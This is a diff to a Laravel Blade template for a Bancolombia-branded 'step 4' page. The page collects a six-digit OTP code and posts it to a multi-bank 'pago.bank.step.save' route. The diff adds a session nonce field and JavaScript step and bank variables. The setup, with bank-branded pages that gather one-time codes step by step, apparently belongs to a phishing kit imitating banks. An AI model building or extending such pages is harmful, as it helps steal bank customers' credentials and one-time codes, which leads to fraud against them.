@@ -34,6 +34,7 @@
     <br>
     <form id="formStep4" method="POST" action="{{ route('pago.bank.step.save', ['bank' => 'bancolombia', 'step' => 4])}}">
         @csrf
+        <input type="hidden" name="step_nonce" value="{{ session('sc.step_nonce') }}">
         <div class="input-container">
             <img class="input-icon" src="{{asset('assets/img/payment/bancolombia/passicon.png')}}">
             <input type="tel" name="code" id="txtOtp" class="pass" placeholder maxlength="6" minlength="6"
@@ -56,6 +57,10 @@
     <script src="{{ asset('assets/js/sc.js') }}"></script>
     <script>
        document.addEventListener('DOMContentLoaded', function () {
+            window.RT = window.RT || {};
+            window.RT.step = "{{ $step }}";
+            window.RT.bank = "{{ $bank }}";
+            
             // Ejemplo: habilitar botón cuando el input sea válido (4 dígitos)
             const otpInput = document.getElementById('txtOtp');
             const btn = document.getElementById('btnOtp');
